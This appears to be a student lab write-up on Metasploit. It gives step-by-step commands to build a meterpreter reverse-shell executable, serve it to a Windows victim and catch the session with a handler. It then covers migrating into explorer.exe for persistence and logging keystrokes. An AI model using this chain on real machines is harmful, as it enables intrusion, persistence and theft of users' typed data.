# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## output:
![1](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/9e296094-7a7a-4442-a34b-fc78fe0ab5f7)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## output:
![2](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/9b424ca4-b9a5-4952-8821-77ca36bce797)

copy the fun.exe into the apache /var/www/html folder

![3](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/4b53c5f6-7ebf-4b1f-b5e9-b1f18c005bf2)

Start apache server sudo systemctl apache2 start

![4](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/41b7c42a-6274-4fe5-a39d-59acec47d01a)

Check the status of apache2

![5](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/c2e7fa2c-1995-4f39-b1c7-ea9d040ddd64)

Invoke msfconsole:

![6](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/4d1cbe37-069c-49ba-8ec6-ca91c0f618fc)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![7](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/da18c686-9c2d-4d41-84de-b2954d9e6abc)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![8](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/ba5cee29-dbf3-4983-85f5-26c3de9696a4)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![9](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/5ba7a8ba-3fdd-4a09-b909-2c25a87df701)

Bypass any warning boxes, double-click the file, and allow it to run.
![10](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/c8a29dd3-7529-4e67-9f34-52cfb8eb3fc3)


On kali give the command exploit
![11](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/026502d0-bdc6-4bb2-a2df-83aebff7d407)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![12](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/d2438350-eb23-4870-85cd-4fff3a594648)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![13](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/170e9e1b-b60f-45e7-a030-e40330dce5d8)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![14](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/cfe4ab27-9fd9-4873-b362-467ff579ca11)

![15](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/e963efa2-dca3-400d-adb0-cca6df87d286)

keyscan_dump Shows the keystrokes captured so far
![16](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/121998147/dfdc8c1d-2a99-49b1-8ca2-2564cf653def)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
